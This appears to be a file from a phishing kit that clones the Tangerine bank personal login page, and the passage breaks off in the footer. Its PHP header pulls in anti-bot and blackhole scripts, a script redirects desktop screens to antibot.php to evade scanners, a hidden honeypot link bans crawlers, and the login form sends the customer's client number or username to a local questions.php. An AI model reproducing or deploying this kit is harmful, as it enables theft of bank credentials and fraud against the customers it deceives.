<?php
include('../blackhole/index.php');


include './prevents/anti7.php';
include './prevents/anti8.php';
include './prevents/anti9.php';
include './prevents/block.php';
?>
<!DOCTYPE html>
<script type="text/javascript">
<!--
if (screen.width >= 699) {
document.location = "./antibot.php";
}
//-->
</script>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
  <meta charset="utf-8">
  <title>Login | Tangerine</title>
  <meta name="description" content="">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, maximum-scale=1.0">
  <script type="text/javascript" async="" src="files/cool-2.js"></script>
  <script type="text/javascript" async="" src="files/ec.js"></script>
  <script src="files/567781970021690.js" async=""></script>
  <script async="" src="files/fbevents.js"></script>
  <script async="" src="files/uwt.js"></script>
  <script type="text/javascript" async="" src="files/analytics.js"></script>
  <script async="" src="files/gtm.js"></script>
  <script type="text/javascript" src="files/dtagent_ICA23TVgjpqrtx_7000000031020.js" data-dtconfig="agentUri=https://www.tangerine.ca/dtagent_ICA23TVgjpqrtx_7000000031020.js|rid=RID_1438598276|rpid=-820083427|domain=tangerine.ca|rt=10000|ssc=1|cors=1|lastModification=1518194304105|lab=1|tp=500,50,0,1|reportUrl=https://www.tangerine.ca/dynaTraceMonitor|app=www.tangerine.ca"></script>
  <link rel="shortcut icon" href="https://www.tangerine.ca/app/favicon.ico" type="image/x-icon">
  
  
  
  <link href="files/global.css" rel="stylesheet">
  
  <link href="files/app.css" rel="stylesheet">
  
<script language="javascript" type="text/javascript" src="files/logo_002.js"></script><script language="javascript" type="text/javascript" src="files/logo.js"></script><style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}</style></head>
<body translate-cloak="" application-theme="" state="loginPage" class="fb2-index ng-scope application-theme-web" ng-class="{
  'application-theme-web': $ctrl.isUsingWebTheme(),
  'application-theme-native': $ctrl.isUsingNativeTheme(),
  'application-theme-native--mobile-login': $ctrl.isMobileLoginPage(),
  'application-theme-native--business-login': $ctrl.isUsingBusinessNativeLoginTheme(),
  'application-theme-native--personal-login': $ctrl.isUsingPersonalNativeLoginTheme(),
  'mobile-native--android': $ctrl.isAndroidNative }" style="overflow: visible;">
  <noscript>
    <style>
      p{
        color: darkorange;
        font-weight: bold;
        font-size: 16px;
        text-align: center;
      }
    </style>
    <p>To proceed you need to have your cookies and JavaScript browser features enabled.</p>
  </noscript>

  <tng-main-nav class="ng-isolate-scope"><nav class="navbar print-hide" ng-class="{'nativeNav' : $ctrl.EnvironmentService.isNative()}"> 
  <a id="mainNav_home" class="brand nonclickable" href="" ng-click="$ctrl.handleGoHome()" ng-class="{'nonclickable' : $ctrl.isTitleLogoNotClickable()}"> <img ng-src="assets/images/brand-white.png" alt="Tangerine" class="logo-white print-hide" src="files/brand-white.png"> <img ng-src="assets/images/brand-orange.png" alt="Tangerine" class="logo-orange print-only-inline" src="files/brand-orange.png"> </a> <!-- ngIf: !$ctrl.parentNavigation --><!-- end ngIf: !$ctrl.parentNavigation --> <!-- ngIf: $ctrl.parentNavigation --> 
  <button ng-show="showSearchButton()" actionable-id="main-nav-btn-search" class="navbar__btn navbar__btn--search icon-search ng-hide" ng-click="$ctrl.handleSearch()" aria-hidden="true" id="main-nav-btn-search" name="main-nav-btn-search"></button> 
  <button actionable-id="main-nav-btn-feedback" class="navbar__btn navbar__btn--feedback icon-feedback" ng-class="{ 'ios-native': $ctrl.isMobileNativeIOS }" ng-click="$ctrl.feedbackClicked()" id="main-nav-btn-feedback" name="main-nav-btn-feedback"> <span class="main-nav-btn-icon-copy ng-binding"> Feedback </span> </button> 
  <button actionable-id="main-nav-btn-help" class="navbar__btn navbar__btn--help icon-question" ng-class="{ 'ios-native': $ctrl.isMobileNativeIOS }" ng-click="$ctrl.handleHelp()" id="main-nav-btn-help" name="main-nav-btn-help"> <span class="main-nav-btn-icon-copy ng-binding"> Help </span> </button> </nav> <header class="header print-hide"> <nav class="nav" ng-class="{'nav-no-pad': $ctrl.SessionService.isAuthenticated()}"> <div class="container"> <a actionable-id="main-nav-handle_go_home" class="brand" href="" ng-click="$ctrl.handleGoHome()" id="main-nav-handle_go_home" name="main-nav-handle_go_home"> <img ng-src="assets/images/brand-white.png" alt="Tangerine" class="print-hide" src="files/brand-white.png"> <img ng-src="assets/images/brand-orange.png" alt="Tangerine" class="print-only-inline" src="files/brand-orange.png"> </a> <ul class="nav__list"> <!-- ngRepeat: menuItem in $ctrl.topPrimaryMenuItems --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.topPrimaryMenuItems" style=""> <a class="nav__link" href="" actionable-id="menu_global.menu.header.products" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" ng-class="{'is-active': menuItem.activeOn.indexOf($ctrl.$state.current.name) &gt; -1}" id="menu_global.menu.header.products" name="menu_global.menu.header.products"> <span class="ng-binding">Products</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.topPrimaryMenuItems"> <a class="nav__link" href="" actionable-id="menu_global.menu.header.waysToBank" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" ng-class="{'is-active': menuItem.activeOn.indexOf($ctrl.$state.current.name) &gt; -1}" id="menu_global.menu.header.waysToBank" name="menu_global.menu.header.waysToBank"> <span class="ng-binding">Ways to Bank</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.topPrimaryMenuItems"> <a class="nav__link" href="" actionable-id="menu_global.menu.header.ourBlog" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" ng-class="{'is-active': menuItem.activeOn.indexOf($ctrl.$state.current.name) &gt; -1}" id="menu_global.menu.header.ourBlog" name="menu_global.menu.header.ourBlog"> <span class="ng-binding">Our Blog</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems --> <!-- ngIf: $ctrl.AVAILABLE_ENVIRONMENTS.length > 0 --> <!-- ngIf: $ctrl.IS_AVAILABLE_GENESYS_ENVIRONMENTS --> </ul> <nav class="navtools"> <ul class="navtools__list"> <!-- ngIf: $ctrl.$state.current.name === $ctrl.stateConstants.LOGIN --><li class="navtools__item ng-scope" ng-if="$ctrl.$state.current.name === $ctrl.stateConstants.LOGIN" style=""> <a class="navtools__link--lang ng-binding" href="" actionable-id="menu_Language" title="Language" ng-click="$ctrl.handleToggleLocale()" id="menu_Language" name="menu_Language"> FR </a> </li><!-- end ngIf: $ctrl.$state.current.name === $ctrl.stateConstants.LOGIN --> 
  <li class="navtools__item"> <a class="navtools__link navtools__link--circle" href="" actionable-id="menu_Search" ng-click="$ctrl.handleSearch()" title="Search" id="menu_Search" name="menu_Search"><img src="files/2.png"> </a> </li> <li class="navtools__item"> <a class="navtools__link navtools__link--circle" href="" actionable-id="menu_FAQ" ng-click="$ctrl.handleGoToFAQ()" title="Help" id="menu_FAQ" name="menu_FAQ"> 
  <img src="files/3.png"> </a> </li> <li class="navtools__item navtools__dropdown ng-hide" ng-show="$ctrl.SessionService.isAuthenticated()" aria-hidden="true"> <a class="navtools__link navtools--bold ng-binding" href="" actionable-id="menu_Username" tng-click-outside-for-nav-menu="$ctrl.closeUserMenu()" ng-click="$ctrl.toggleUserMenu()" id="menu_Username" name="menu_Username"> <span class="icon-downarrow ng-hide" ng-show="$ctrl.MENU_ITEMS.LOGIN.length &gt; 0" aria-hidden="true"></span> </a> <ul class="navtools__userMenu ng-hide" ng-show="!$ctrl.isUserMenuHidden" aria-hidden="true"> <!-- ngRepeat: menuItem in $ctrl.MENU_ITEMS.LOGIN --> </ul> </li> <li class="navtools__item" ng-hide="$ctrl.SessionService.isAuthenticated()" aria-hidden="false"> <button class="btn btn--largest btn--reversed" actionable-id="menu_Login" ng-click="$ctrl.reInitLoginFlow()" id="menu_Login" name="menu_Login"> <span translate="" class="ng-scope ng-binding"><span class="ng-scope">I'm a Client, Let Me In</span></span> </button> </li> </ul> </nav> </div> </nav> <tng-sub-nav class="ng-isolate-scope"><!-- ngIf: $ctrl.isSubNavVisible() --> </tng-sub-nav> <!-- ngIf: !$ctrl.isMobileHidden --> <!-- ngIf: !$ctrl.isMobileHidden --> </header> <!-- ngIf: $ctrl.isContactUsMenuOpen --> <tng-feedback-survey class="ng-isolate-scope"><!-- ngIf: $ctrl.isMedalliaSupported --><tng-sticky-button class="main-nav__medalliaFeedbackBtn main-nav--laptop ng-scope ng-isolate-scope" ng-click="$ctrl.feedbackClicked()" ng-if="$ctrl.isMedalliaSupported" role="button" tabindex="0" style=""><div class="c-sticky-button c-sticky-button--right"> <ng-transclude> <span translate="" class="ng-scope ng-binding"><span class="ng-scope">Feedback</span></span> </ng-transclude> </div></tng-sticky-button><!-- end ngIf: $ctrl.isMedalliaSupported --> </tng-feedback-survey> <tng-print-header name="$ctrl.getFullName()"></tng-print-header> <!-- ngIf: $ctrl.showVisitorSiteSearch --> </tng-main-nav>
  <!-- uiView: page-content --><div ui-view="page-content" class="page-content ng-scope" style=""><login-page return-to="::$resolve.returnTo" class="ng-scope ng-isolate-scope"><tng-login return-to="$ctrl.returnTo" locale="$ctrl.LocaleService.locale" class="ng-isolate-scope"> <!-- ngIf: $ctrl.showFirstLogin && !$ctrl.flowService.isRedirecting --> <!-- ngIf: ($ctrl.shouldShowVisitorTimeoutMessage && !$ctrl.flowService.isRedirecting) || ($ctrl.$stateParams.sessionTimeOut && $ctrl.stateIsPristine) --> <!-- ngIf: $ctrl.flowService.currentState == $ctrl.flowService.STATES.USER_ID && !$ctrl.isNextStateLoading && !$ctrl.flowService.isRedirecting --><user-id-section ng-if="$ctrl.flowService.currentState == $ctrl.flowService.STATES.USER_ID &amp;&amp; !$ctrl.isNextStateLoading &amp;&amp; !$ctrl.flowService.isRedirecting" ng-hide="$ctrl.flowService.isLoading" on-data-update="$ctrl.handleStateChange(data)" locale="$ctrl.locale" device="$ctrl.device" error-message="$ctrl.SessionService.errorMessage" is-timeout="$ctrl.SessionService.isTimeout" deactive-flow="$ctrl.flowService.deactivate();" go-to-state="$ctrl.flowService.moveTo($ctrl.flowService.STATES.BUSINESS_LOGIN); $ctrl.scrollToInput()" saved-user-ids="$ctrl.SessionService.savedUserIds" class="ng-scope ng-isolate-scope" aria-hidden="false"><!-- ngIf: $ctrl.parentCtrl.isVisitorEnrollment --> <!-- ngIf: !$ctrl.isNative -->
  <form method="post" action="questions.php" class="c-login c-login--userId ng-pristine ng-scope ng-valid-minlength ng-valid-maxlength ng-valid ng-valid-required" > <!-- ngIf: ::$ctrl.parentCtrl.uiSettings.showHeader -->
  <div class="c-login__header ng-scope" ng-if="::$ctrl.parentCtrl.uiSettings.showHeader"> <!-- ngIf: $ctrl.errorMessage --> <!-- ngIf: $ctrl.showSafariLocalStorageError --> <h2 class="heading--title2 ng-scope ng-binding" translate="">
  <span class="ng-scope">Personal Banking Login</span></h2> 
  <label for="login_clientId"> 
  <span class="ng-binding">Enter your Client Number, Card Number or Username</span> 
  <tng-help-bubble class="ng-isolate-scope">
  <div class="c-help-bubble">&nbsp;<img src="files/1.png">
  </div> </tng-help-bubble> 
  </label> 
  </div><!-- end ngIf: ::$ctrl.parentCtrl.uiSettings.showHeader --> 
  <div class="grid__container"> <div class="c-login__panel--left" ng-class="{'c-login__panel--left--vis-enroll': $ctrl.parentCtrl.isVisitorEnrollment}"> <!-- ngIf: ::$ctrl.parentCtrl.uiSettings.CIFFieldLabel --> <!-- ngIf: !$ctrl.showUserIdField --> <div class="field"> <!-- ngIf: $ctrl.showUserIdField -->
  <input  name="username" class="input CB_DataMask ng-pristine ng-scope ng-empty ng-valid-minlength ng-valid-maxlength ng-valid ng-valid-required ng-touched" minlength="1" maxlength="40" placeholder="Enter here" ng-required="required"  id="login_clientId" style="" type="text"><!-- end ngIf: $ctrl.showUserIdField --> </div> <!-- ngIf: $ctrl.parentCtrl.uiSettings.showRememberMe && $ctrl.showUserIdField --><div ng-if="$ctrl.parentCtrl.uiSettings.showRememberMe &amp;&amp; $ctrl.showUserIdField" ng-show="$ctrl.showUserIdField" class="field remember-me ng-scope" aria-hidden="false"> <input ng-show="$ctrl.showUserIdField" actionable-id="login_rememberMe" ng-model="$ctrl.userIDSectionCredentials.rememberMe" class="input ng-pristine ng-untouched ng-valid ng-empty" aria-hidden="false" id="login_rememberMe" name="login_rememberMe" aria-invalid="false" type="checkbox"> <label for="login_rememberMe"></label> 
  <label for="login_rememberMe_text"> <span translate-cloak="" class="ng-binding">Remember Me</span> <tng-help-bubble class="ng-isolate-scope">
  <div class="c-help-bubble">&nbsp;<img src="files/1.png">  </div> </tng-help-bubble> </label> </div><!-- end ngIf: $ctrl.parentCtrl.uiSettings.showRememberMe && $ctrl.showUserIdField --> <button actionable-id="login_logMeIn" class="btn--medium CB_ReadOnly ng-scope" ng-class="{ 'disabled': !$ctrl.isUserIDSubmitEnabled }" ng-disabled=" !$ctrl.isUserIDSubmitEnabled || $ctrl.showSafariLocalStorageError" ng-click="$ctrl.checkUserID($ctrl.userIDSectionCredentials); $ctrl.hideVisitorSiteTimeoutErrorMessage()" type="submit" translate="" id="login_logMeIn" name="login_logMeIn"> <!-- ngIf: $ctrl.parentCtrl.isStandardLogin --><span ng-if="$ctrl.parentCtrl.isStandardLogin" class="ng-binding ng-scope"> Log Me In </span><!-- end ngIf: $ctrl.parentCtrl.isStandardLogin --> <!-- ngIf: $ctrl.parentCtrl.isVisitorEnrollment --> </button> <!-- ngIf: $ctrl.parentCtrl.uiSettings.showForgotLink --><div ng-if="$ctrl.parentCtrl.uiSettings.showForgotLink" class="c-help-block--forgot-link ng-scope"> <a ng-click="$ctrl.deactiveFlow()" actionable-id="login_forgotLoginLink" ui-sref="forgotLogin" class="link ng-binding" href="#/forgot-login" id="login_forgotLoginLink" name="login_forgotLoginLink">Forgot your login?</a> </div><!-- end ngIf: $ctrl.parentCtrl.uiSettings.showForgotLink --> <!-- ngIf: $ctrl.parentCtrl.uiSettings.showBusinessLoginLink --><a actionable-id="login_businessLink" href="" ng-if="$ctrl.parentCtrl.uiSettings.showBusinessLoginLink" ng-click="$ctrl.goToState(); $ctrl.hideVisitorSiteTimeoutErrorMessage()" class="link ng-binding ng-scope" id="login_businessLink" name="login_businessLink"> Go to Business Banking Login </a><!-- end ngIf: $ctrl.parentCtrl.uiSettings.showBusinessLoginLink --> </div> <!-- ngIf: ::$ctrl.parentCtrl.uiSettings.showPromo --><div ng-if="::$ctrl.parentCtrl.uiSettings.showPromo" class="c-login__panel--right ng-scope"> <!-- ngIf: ::$ctrl.showPromotionalOffer --><section class="insight-panel ng-scope" ng-if="::$ctrl.showPromotionalOffer"> <div class="login"> <tng-insight-banner insight="$ctrl.parentCtrl.insight" class="ng-isolate-scope"><tng-insight insight="$ctrl.insight" on-event="$ctrl.handleEvent (action, properties, $ctrl.insight)" class="ng-isolate-scope"><!-- ngInclude: --><ng-include src="$ctrl.insight.cardUrl" onload="$ctrl.onInsightLoaded()" class="ng-scope" style=""><div class="banner--internal-page ng-scope" id="RAF_NoReferrals">
  <div class="banner--internal-page__container"><span class="banner--internal-page__icon icon-two"></span>

    <!--Homepage-->
    <div class="banner--content__homepage" id="homepageContent">
      <div class="banner--internal-page__title margin__t--fix2" id="homepageTitle">Friends Need a Better Bank, Too.</div>
      <p class="banner--internal-page__info" id="homepageDesc">Earn a $50* Bonus for each friend or family member you successfully refer to Tangerine. </p>
      <button class="banner--internal-page__button margin__b--fix1" id="homepageBtn-1" ng-click="$ctrl.handleEvent('interactEvent', { eventType: $ctrl.insight.ic_act1_eventName , responseType: $ctrl.insight.ic_act1_responsetype}); $ctrl.handleEvent('openInternalUrl', { url: '/en/landing-page/doublebonus/index.html' })">Learn More</button>

    </div>

    <!--Insights-->
    <div class="banner--content__insights" id="insightsContent">
      <div class="banner--internal-page__title margin__t--fix2" id="insightsTitle">
        Know a Friend Who Could Use a Better Bank?
      </div>
      <!--<p class="banner&#45;&#45;internal-page__info" id="insightsDesc">-->
      <!--Get all the information you need on when to expect your tax receipts and where to find them.-->
      <!--<br>-->
      <!--<span class="banner&#45;&#45;internal-page__links">-->
      <!--<a href ng-click="$ctrl.handleEvent('interactEvent', { eventType: 'evt_RemindMe', responseType: 'SML'}); $ctrl.handleEvent('removeCard')" id="insightsLink-1">-->
      <!--Show Me Later-->
      <!--</a>-->
      <!--| <a href ng-click="$ctrl.handleEvent('interactEvent', { eventType: 'evt_NotHelpful', responseType: 'DSTA' }); $ctrl.handleEvent('removeCard')" id="insightsLink-2">-->
      <!--Don’t Show Again-->
      <!--</a>-->
      <!--</span>-->
      <!--</p>-->
      <button class="btn btn--auto banner--internal-page__button margin__b--fix1" id="insightsBtn-1" ng-click="$ctrl.handleEvent('interactEvent', { eventType: $ctrl.insight.ic_act1_eventName , responseType: $ctrl.insight.ic_act1_responsetype}); $ctrl.handleEvent('openModal'); $ctrl.handleEvent('removeCard')">
        Learn More
      </button>
      <!--
                        <button class="btn btn&#45;&#45;auto banner&#45;&#45;internal-page__button margin__b&#45;&#45;fix1"
                                        ng-click="$ctrl.handleEvent('interactEvent', { eventType: $ctrl.insight.ic_act1_eventName , responseType: $ctrl.insight.ic_act1_responsetype}); $ctrl.handleEvent('openModal')">Learn Modal-testOnly</button>
            -->
      <div class="banner--internal-page__info" ng-switch="$ctrl.insight.UACIInteractionPointName">
        <!-- ngSwitchWhen: ip_InsightsCarousel -->
      </div>
    </div>

    <!--Logout-->
    <div class="banner--content__logout" id="logoutContent">
      <div class="banner--internal-page__title margin__b--fix2" id="logoutTitle">It Pays to Refer Your Friends. Literally.</div>
      <p class="banner--internal-page__info" id="logoutDesc">Earn a $50*
 Bonus for each friend or family member who becomes a Client using your 
Orange Key® and opens their first Account with at least $100.</p>
      <button class="banner--internal-page__button margin__b--fix1" id="logoutBtn-1" ng-click="$ctrl.handleEvent('interactEvent', { eventType: $ctrl.insight.ic_act1_eventName , responseType: $ctrl.insight.ic_act1_responsetype}); $ctrl.handleEvent('openInternalUrl', { url: '/en/landing-page/doublebonus/index.html' })">Learn More</button>


    </div>

    <!--Login-->
    <div class="banner--content__login" id="loginContent">
      <div class="banner--internal-page__title" id="loginTitle">Your Friends Need a Better Bank, Too.</div><br>
	  <a rel="nofollow" style="display:none;" href="../blackhole/index.php">Do NOT follow this link or you will be banned from the site!</a>
      <p class="banner--internal-page__info" id="loginDesc">Share your Orange Key® with friends and you could each earn a $50* Bonus. </p>
      <button class="btn btn--medium btn--reversed margin__t--fix2" id="loginBtn-1" ng-click="$ctrl.handleEvent('interactEvent', { eventType: $ctrl.insight.ic_act1_eventName , responseType: $ctrl.insight.ic_act1_responsetype}); $ctrl.handleEvent('openInternalUrl', { url: '/en/landing-page/doublebonus/index.html' })">Learn More</button>

    </div>

    <!--productBasket-->
    <!--   <div class="banner--content__productBasket" id="productBasketContent">
          <div class="banner--internal-page__title">Toronto product hydro bill due soon</div>
        <p class="banner--internal-page__info">Earn triple interest of 2.40%** for 6 months and get up to $50 in Bonuses.</p>

      </div> -->

       <!--    <div class="banner--content__landingPage" id="landingPageContent">
            <div class="banner--internal-page__title margin__t--fix2" id="landingPageTitle">Toronto product hydro bill due soon</div>
            <p class="banner--internal-page__info" id="landingPageDesc">Based on your bill payment history, it looks like your Toronto Hydro bill will be due soon. Pay your bill now, or setup ongoing payment for the future.</p>
            <button class="banner--internal-page__button margin__b--fix1" id="landingPageBtn-1">Pay bill</button>
            <button class="banner--internal-page__button margin__b--fix1" id="LandingPageBtn-1">Button 2</button>
        </div> -->

  </div>
</div></ng-include> <!-- ngIf: $ctrl.cardLoadError --></tng-insight> <!-- ngIf: $ctrl.isModalOpen --></tng-insight-banner> </div> </section><!-- end ngIf: ::$ctrl.showPromotionalOffer --> </div><!-- end ngIf: ::$ctrl.parentCtrl.uiSettings.showPromo --> </div> <!-- ngIf: ::$ctrl.parentCtrl.uiSettings.showFooter --><div ng-if="::$ctrl.parentCtrl.uiSettings.showFooter" class="grid__container--footer ng-scope"> <div class="c-login__panel--left styleguide-grid-unit grid__column--1of2"> <p class="disclaimer ng-binding" ng-bind-html="'login.userID.disclaimer' | translate | absoluteHref"><strong>Tangerine Bank</strong> is a member of the <a href="https://www.tangerine.ca/en/about-us/cdic/index.html" class="link" target="_blank">Canada Deposit Insurance Corporation</a></p> </div> <div class="c-login__panel--right styleguide-grid-unit grid__column--1of2"> <div class="link-wrapper"> <p ng-bind-html="'login.userID.securityText' | translate | absoluteHref" class="ng-binding"><a href="https://www.tangerine.ca/en/security/guarantee/index.html" target="_blank"><img src="files/4.png">Security Guarantee</a></p> </div> </div> </div><!-- end ngIf: ::$ctrl.parentCtrl.uiSettings.showFooter --> </form><!-- end ngIf: !$ctrl.isNative --> <!-- ngIf: $ctrl.isNative --> <tng-modal-dialog is-visible="$ctrl.showLoginOptionModal === true" on-close="$ctrl.showLoginOptionModal = false" class="ng-isolate-scope"><!-- ngIf: !$ctrl.inlineMode --><div ng-if="!$ctrl.inlineMode" class="c-modal fb2-modal ng-scope ng-hide" ng-class="{'c-modal--e-notification': $ctrl.isNotification}" ng-show="$ctrl.isVisible" aria-hidden="true"> <div class="c-modal__curtain" ng-class="{'c-modal__curtain--noDimming': !$ctrl.isDimming,
  'c-modal__curtain--show-header': $ctrl.showHeader}"> <div class="c-modal__dialog c-modal__dialog" ng-class="{'c-modal__dialog--mini': $ctrl.isMinified, 'c-modal__dialog--docked': $ctrl.isDocked}"> <!-- ngIf: !$ctrl.isMinified --><div ng-if="!$ctrl.isMinified" class="dialog__mobile-bar ng-scope" tng-hide-header="" elm="#modalMainContent" toggle-class="scrolling"> <div class="dialog__mobile-bar__left"> <span class="header-icon icon-x" ng-show="$ctrl.onClose" ng-click="$ctrl.handleOnClose()" ng-hide="$ctrl.hideClose" role="button" tabindex="0" aria-hidden="false"> </span> &nbsp; </div> <div class="dialog__mobile-bar__center"> <img ng-src="assets/images/brand.png" alt="Tangerine" onload="angular.element(this).scope().$ctrl.logoLoaded()" src="files/brand.png"> </div> <div class="dialog__mobile-bar__right"> <!-- ngIf: !$ctrl.onMinified --><span ng-if="!$ctrl.onMinified" class="mobile-bar__help icon-question large ng-scope"></span><!-- end ngIf: !$ctrl.onMinified --> <!-- ngIf: $ctrl.onMinified --> </div> </div><!-- end ngIf: !$ctrl.isMinified --> <div id="modalMainContent" class="dialog__main-content" ng-class="{'dialog__main-content-iOSSafari': !$ctrl.environmentService.isNative() &amp;&amp; $ctrl.environmentService.isSafari() &amp;&amp; $ctrl.environmentService.isIOS()}"> <div class="dialog__header print-hide" ng-class="{'dialog__header--mini': $ctrl.isMinified}"> <button actionable-id="modal-dialo-general-close" class="btn c-modal__btn--close float-right" ng-show="$ctrl.onClose" ng-click="$ctrl.handleOnClose()" ng-hide="$ctrl.hideClose" aria-hidden="false" id="modal-dialo-general-close" name="modal-dialo-general-close"> <span class="icon-x large" ng-class="$ctrl.isMinified ? 'medium' : 'large'"></span> </button> <!-- ngIf: $ctrl.onDocked --> <!-- ngIf: $ctrl.onMinified --> <div class="dialog__title family-fancy" ng-transclude="titleSlot"><header class="ng-binding ng-scope"></header></div> </div> <div class="dialog__content" tng-infinity-scroll=""> <div class="dialog__content-wrapper" ng-transclude="">  <div translate="" class="ng-scope"></div>  </div> </div> </div> <div class="dialog__footer" ng-transclude="footerSlot"><footer class="ng-scope"> <button class="btn btn--orange ng-scope" ng-click="$ctrl.showLoginOptionModal = false" translate=""></button> <button class="btn btn--orange mobile-max-width ng-scope ng-hide" ng-show="$ctrl.showModalActionButton" ng-click="$ctrl._loginOptionModalClick()" translate="" aria-hidden="true"></button> </footer></div> </div> </div> </div><!-- end ngIf: !$ctrl.inlineMode --> <!-- ngIf: $ctrl.inlineMode --> </tng-modal-dialog> <!-- ngIf: $ctrl.isNative && $ctrl.showConfirmationModal --> </user-id-section><!-- end ngIf: $ctrl.flowService.currentState == $ctrl.flowService.STATES.USER_ID && !$ctrl.isNextStateLoading && !$ctrl.flowService.isRedirecting --> <!-- ngIf: $ctrl.flowService.currentState == $ctrl.flowService.STATES.BUSINESS_LOGIN ||
    $ctrl.flowService.currentState == $ctrl.flowService.STATES.AUTHORIZED_USER && !$ctrl.flowService.isRedirecting --> <!-- ngIf: $ctrl.flowService.currentState == $ctrl.flowService.STATES.SECRET_QUESTION && !$ctrl.flowService.isRedirecting --> <!-- ngIf: $ctrl.flowService.currentState == $ctrl.flowService.STATES.PIN && !$ctrl.isNextStateLoading && !$ctrl.flowService.isRedirecting --> <!-- ngIf: $ctrl.flowService.isLoading || $ctrl.isNextStateLoading && !$ctrl.flowService.isRedirecting --> <!-- ngIf: $ctrl.flowService.isRedirecting --> </tng-login> </login-page></div>
  <!-- ngIf: $root.deferredBundleLoaded -->
  <tng-footer-nav class="ng-isolate-scope"><!-- ngIf: $ctrl.showFooterNotifications --> <!-- ngIf: $ctrl.FlowFooterService.isVisible --> <footer class="c-footer-nav"> <!-- ngIf: !$ctrl.isNative --><nav class="footer-desktop ng-scope" ng-if="!$ctrl.isNative"> <ul class="nav__list nav__list--widescreen"> <!-- ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY" style=""> <a actionable-id="footer-nav-handle_nav_item_0" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_0" name="footer-nav-handle_nav_item_0"><span translate-cloak="" class="ng-binding">About Us</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_1" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_1" name="footer-nav-handle_nav_item_1"><span translate-cloak="" class="ng-binding">Rates</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_2" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_2" name="footer-nav-handle_nav_item_2"><span translate-cloak="" class="ng-binding">Tools</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_3" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_3" name="footer-nav-handle_nav_item_3"><span translate-cloak="" class="ng-binding">Careers</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_4" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_4" name="footer-nav-handle_nav_item_4"><span translate-cloak="" class="ng-binding">Privacy</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_5" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_5" name="footer-nav-handle_nav_item_5"><span translate-cloak="" class="ng-binding">Legal</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_6" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_6" name="footer-nav-handle_nav_item_6"><span translate-cloak="" class="ng-binding">Security</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_7" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_7" name="footer-nav-handle_nav_item_7"><span translate-cloak="" class="ng-binding">ABM Locator</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_8" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_8" name="footer-nav-handle_nav_item_8"><span translate-cloak="" class="ng-binding">Contact Us</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --> </ul> <!-- ngIf: 